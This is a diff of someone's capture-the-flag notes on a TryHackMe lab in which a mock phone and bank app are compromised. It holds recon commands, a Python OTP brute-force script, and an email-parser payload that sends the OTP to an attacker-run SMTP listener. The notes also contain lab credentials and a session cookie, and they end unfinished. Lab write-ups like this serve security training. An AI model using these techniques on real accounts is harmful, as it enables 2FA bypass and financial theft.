@@ -4,14 +4,17 @@
 
 |================================================================
 - Name: 
-- IP Address: 10.66.129.33
+- IP Address: 10.67.171.83
 - OS: 
 - Notes: 
 
 //CREDS:
 	PHONE_PASSCODE = "210701"
-	HOPFLIX:
+	Hopflix:
 		sbreachblocker@easterbunnies.thm | malharerocks
+	Hopsec Bank:
+		sbreachblocker@easterbunnies.thm | malharerocks
+		(NEEDs a OTP for each login)
 
 //Flags:
 	THM{eggsposed_source_code}
@@ -43,7 +46,7 @@ throne123*
 
 //The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.
 
-ip=10.66.129.33
+ip=10.67.171.83
 
 //This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.
 
@@ -97,6 +100,10 @@ PORT   STATE         SERVICE
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+//Adding host
+-- Add /etc/hosts file entries --
+echo -e "$ip \t breachblocker.thm" | sudo tee -a /etc/hosts
+cat /etc/hosts
 
 // 8443/tcp	ssl/http nginx 1.29.3
 //https://$ip:8443/
@@ -110,39 +117,25 @@ PORT   STATE         SERVICE
 -- feroxbuster --
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-feroxbuster -k -u https://$ip:8443/ -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx,py,conf -o feroxbuster_8443.out
+feroxbuster -k -u https://breachblocker:8443/ -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx,py,conf -o feroxbuster_8443.out
 
-200  https://10.65.166.164:8443/main.js
-200  https://10.65.166.164:8443/selfie.png
-200  https://10.65.166.164:8443/breaky.png
-200  https://10.65.166.164:8443/wallpaper.png
-200  https://10.65.166.164:8443/
-200  https://10.65.166.164:8443/index.html
-401  https://10.65.166.164:8443/api/get-last-viewed
-200  https://10.65.166.164:8443/hopflix-874297.db
-200  https://10.65.166.164:8443/main.py
-200  https://10.65.166.164:8443/requirements.txt
-
-
-feroxbuster -k -u https://$ip:8443/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --scan-limit 2 -o feroxbuster_8443_quickhits.out
-
-200  https://10.65.166.164:8443/breaky.png
-200  https://10.65.166.164:8443/main.js
-200  https://10.65.166.164:8443/wallpaper.png
-200  https://10.65.166.164:8443/selfie.png
-200  https://10.65.166.164:8443/
-200  https://10.65.166.164:8443/nginx.conf
+200  https://breachblocker.thm:8443/main.js
+200  https://breachblocker.thm:8443/selfie.png
+200  https://breachblocker.thm:8443/wallpaper.png
+200  https://breachblocker.thm:8443/breaky.png
+200  https://breachblocker.thm:8443/
+200  https://breachblocker.thm:8443/index.html
+200  https://breachblocker.thm:8443/hopflix-874297.db
+200  https://breachblocker.thm:8443/main.py
+200  https://breachblocker.thm:8443/requirements.txt
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 //Grab WebFiles
-curl -k https://10.65.166.164:8443/main.js -o main.js
-curl -k https://10.65.166.164:8443/index.html -o index.html
-curl -k https://10.65.166.164:8443/requirements.txt -o requirements.txt
-curl -k https://10.65.166.164:8443/nginx.conf -o nginx.conf
-curl -k https://10.65.166.164:8443/main.py -o main.py
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+curl -k https://breachblocker.thm:8443/main.js -o main.js
+curl -k https://breachblocker.thm:8443/index.html -o index.html
+curl -k https://breachblocker.thm:8443/requirements.txt -o requirements.txt
+curl -k https://breachblocker.thm:8443/main.py -o main.py
 
 
 //I need an account number and a pin to sign into the banking app, so let’s enumerate the phone some more.
@@ -162,74 +155,15 @@ const PHONE_PASSCODE = "210701"
 
 //I turned off the authenticator face id so I don’t have issues in the future.
 
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 
 // First Flag
 //What's the CODE_FLAG?
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-//There is not much to get from the phone interface, apart from seeing it connect to several API endpoints. Instead, by fuzzing the application with quickhits.txt, I discover the nginx.conf file.
+vim main.py
 
-ffuf -k -u "https://10.64.142.189:8443/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 100 -mc all -ic -fc 404
-
-//NOTE:
--mc all
-	Match all HTTP status codes
-
--ic
-	Ignore wordlist case
-
--fc 404
-	Filter out HTTP 404 responses
-	Removes “Not Found” noise
-
-//Lets read the Nginx configuration directly.
-
-curl -k https://$ip:8443/nginx.conf -o nginx.conf
-
-// nginx.conf
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-user  nginx;
-worker_processes 4;
-error_log  /var/log/nginx/error.log warn;
-pid        /var/run/nginx.pid;
-events {
-    worker_connections 2048;
-}
-http {
-    include       /etc/nginx/mime.types;
-    default_type  application/octet-stream;
-    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
-                      '$status $body_bytes_sent "$http_referer" '
-                      '"$http_user_agent" "$http_x_forwarded_for"';
-    access_log  /var/log/nginx/access.log  main;
-    sendfile        on;
-    keepalive_timeout  300;
-    server {
-        listen 443 ssl http2;
-        ssl_certificate /app/server.cert;
-        ssl_certificate_key /app/server.key;
-        ssl_protocols TLSv1.2;
-        location / {
-            try_files $uri @app;
-        }
-        location @app {
-            include uwsgi_params;
-            uwsgi_pass unix:///tmp/uwsgi.sock;
-        }
-    }
-}
-daemon off;
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-//One directive immediately stands out: try_files. This tells Nginx to first check whether the requested URI exists as a file on disk and serve it directly. Only if the file does not exist is the request forwarded to the uWSGI backend.
-
-//Interesting code above:
-	location / {
-    	try_files $uri @app;
-	}
-
-//We can abuse this behavior to read files from the web application directory, including source code. Since we know this is a Python application, we try common filenames such as app.py and hello.py. This succeeds with main.py, allowing us to leak the application source code and capture the first flag.
-
+#Found a flag in the main.py
 
 //THM{eggsposed_source_code}
 
@@ -241,10 +175,10 @@ daemon off;
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 //The leaked source code also references two database files: hopflix-874297.db and hopsecbank-12312497.db. Attempting to retrieve them shows that hopsecbank-12312497.db does not exist in the web root, but hopflix-874297.db does.
 
-curl -k https://$ip:8443/hopflix-874297.db -o hopflix-874297.db
+curl -k https://breachblocker.thm:8443/hopflix-874297.db -o hopflix-874297.db
 //Got it
 
-curl -k https://$ip:8443/hopsecbank-12312497.db
+curl -k https://breachblocker.thm:8443/hopsecbank-12312497.db
 //Nothing
 
 file hopflix-874297.db
@@ -300,8 +234,14 @@ print(password)
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+python flag2_solve.py
+//malharerocks
+
+
 //WebSite
-	https://$ip:8443/
+	https://breachblocker.thm:8443/
+
+//Go to the Hopflix app
 
 //Creds
 	sbreachblocker@easterbunnies.thm | malharerocks
@@ -314,39 +254,46 @@ print(password)
 
 // Third Flag
 //What's the BANK_FLAG?
+#URL: https://breachblocker.thm:8443
+#Account ID:	sbreachblocker@easterbunnies.thm
+#Pin/Password:	malharerocks 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 # RoadMap: (OTP email → 2FA → release)
 
-#What we know:
-- Bank account ID: 'sbreachblocker@easterbunnies.thm'
-- Bank PIN: 'malharerocks' 
+//Lets try using the same credentials we obtained for Hopflix to log in to the Hopsec Bank application.
+
+//Log in successful; however, after authentication, the application asks us to choose an email address to which a 2FA OTP code will be sent.
 
 - If PIN is correct, server returns trusted_emails or trusted_domains for OTP routing
 - OTP is emailed (SMTP) and then verified by /api/verify-2fa
 - After 2FA verified, /api/release-funds returns {flag: BANK_FLAG}
 
 
-//Adding hosts entry to be safe.
--- Add /etc/hosts file entries --
-echo -e "$ip \t easterbunnies.thm" | sudo tee -a /etc/hosts
-cat /etc/hosts
-
-
 //Looking back at the code used to generate such code shows that it is truly random.
 
-// excerpt from main.py
+//Once authenticated, the server generate a new session for Hopsec Bank, and returns a response indicating that 2FA is required.
+
+// Response
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+HTTP/2 200 OK
+Server: nginx/1.29.3
+Date: Sun, 01 Feb 2026 04:30:51 GMT
+Content-Type: application/json
+Content-Length: 115
+Vary: Cookie
+Set-Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6znsE4cLTJIg0py4dExvwqW0K2KIrbJop_lI4O6wZagK-s5zpdOXjM0tL3dls-YbxOF3NlHlktn-sU9yeIa6rOzPa24D9wf090PZ.aX7W-w.a7t8N-CQclC63phRY3yShThF6Cg; HttpOnly; Path=/
 
+{"requires_2fa":true,"success":true,"trusted_emails":["carrotbane@easterbunnies.thm","malhare@easterbunnies.thm"]}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Also by clicking on Send OTP, a 6-digits OTP encrypted using AES, will be generated and stored inside the session, then sent to the user’s email address.
+
+
+// main.py (Send OTP)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 ...
-@app.route('/api/send-2fa', methods=['POST'])
-def send_2fa():
-    data = request.json
-    otp_email = str(data.get('otp_email', ''))
-
-    if not session.get('bank_authenticated', False):
-        return jsonify({'error': 'Access denied.'}), 403
-
-    # Generate 2FA code
+# Generate 2FA code
     two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
     session['bank_2fa_code'] = encrypt(two_fa_code)
 
@@ -354,7 +301,15 @@ def send_2fa():
         return jsonify({'success': True})
     else:
         return jsonify({'success': False})
+...
 
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//The /api/verify-2fa endpoint does not implement rate limiting, and while an invalid OTP deletes the stored code.
+
+// main.py (/api/verify-2fa)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+...
 @app.route('/api/verify-2fa', methods=['POST'])
 def verify_2fa():
     data = request.json
@@ -377,67 +332,86 @@ def verify_2fa():
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-//However the logic behind how the application handles emails is deeply flawed. It does a few checks to make sure the email address is valid, the correct structure, and is in the allowed emails/domains lists.
+//The authenticated session remains valid.
 
-// excerpt from main.py
+//Because the session remains active and OTP attempts are unrestricted, the OTP verification mechanism can be abused through repeated attempts within the same authenticated session.
+
+//We can use this python code to brute force the OTP using our Hopsec Bank session...
+
+// Brute_Force
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+import requests
+import urllib3
 
+urllib3.disable_warnings()
+
+URL = "https://breachblocker.thm:8443/api/verify-2fa"
+
+SESSION = "HopsecBank_SESSION"
+
+HEADERS = {
+    "Content-Type": "application/json",
+    "Cookie": f"session={SESSION}",
+    "Connection": "close"
+}
+
+for i in range(100000, 1000000):
+    otp = f"{i:06d}"
+
+    r = requests.post(
+        URL,
+        headers=HEADERS,
+        data=f'{{"code":"{otp}"}}',
+        verify=False,
+        allow_redirects=False,
+        timeout=3
+    )
+
+    if "No 2FA code generated" in r.text:
+        print("[!] SESSION LOST – OTP DELETED")
+        print("Response:", r.text)
+        break
+
+    if len(r.text) != 25:
+        print("[+] OTP FOUND:", otp)
+        print("Status:", r.status_code)
+        print("Response:", r.text)
+        break
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+---
+
+//Looking at the code responsible for OTP generation, we see that the application generates a random code and then calls the send_otp_email function, passing both the generated code and the email address supplied by the user.
+
+
+// send_otp_email 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 ...
-def send_otp_email(otp, to_addr):
-    if not validate_email(to_addr):
-        return -1
-                
-    allowed_emails= session['bank_allowed_emails']
-    allowed_domains= session['bank_allowed_domains']
-    domain = to_addr.split('@')[-1]
-    if domain not in allowed_domains and to_addr not in allowed_emails:
-        return -1
-                
-    from_addr = 'no-reply@hopsecbank.thm'
-    message = f"""\
-    Subject: Your OTP for HopsecBank
-
-    Dear you,
-    The OTP to access your banking app is {otp}.
+@app.route('/api/send-2fa', methods=['POST'])
+def send_2fa():
+    data = request.json
+    otp_email = str(data.get('otp_email', ''))
     
-    Thanks for trusting Hopsec Bank!"""
+    if not session.get('bank_authenticated', False):
+        return jsonify({'error': 'Access denied.'}), 403
+    
+    # Generate 2FA code
+    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
+    session['bank_2fa_code'] = encrypt(two_fa_code)
 
-    s = smtplib.SMTP('smtp')
-    s.sendmail(from_addr, to_addr, message)
-    s.quit()
+    if send_otp_email(two_fa_code, otp_email) != -1:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'success': False})
 ...
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-//The real problem here is this line:
-
-if domain not in allowed_domains and to_addr not in allowed_emails:
-        return -1
-
-//This doesn’t ensure that both the domain and email address are valid. Due to how it extracts the domain from the email address, I am able to alter the email so that it matches to an allowed domain but is directed towards my IP.
-
-//By ensuring the email ends with @easterbunnies.thm, the check domain not in allowed_domains always evaluates to False which allows the function to continue, regardless of the actual destination address.
-
-//There is a known vulnerability within SMTP and it allows for us to comment out a part of our email address. Check the link to go deeper on exploiting email parsers to bypass these types of checks.
-https://portswigger.net/research/splitting-the-email-atom
-
-//We’ll need to host an SMTP server in order to receive the one time pass. Since Kali Linux doesn’t come default with one, lets use a tool called aiosmtpd.
-
-//Install
-sudo apt install python3-aiosmtpd
-
-//Start Listener
-aiosmtpd -n -l 192.168.135.149:25
-
-//This can capture a POST request to the /api/send2fa endpoint if we change the email field to the payload.
+//Inspecting the send_otp_email function, we see that it performs several checks to validate the supplied email address. It ensures the email format is valid, restricts certain characters, and verifies that either the full email address or the domain is allowed.
 
 
-//The payload should look something like:
-attacker@[ATTACKING_IP](@easterbunnies.thm
-
-//I am trying:
-gh05t@[192.168.135.149](@easterbunnies.thm
 
 FIGURE THIS OUT....I AM Tired
 
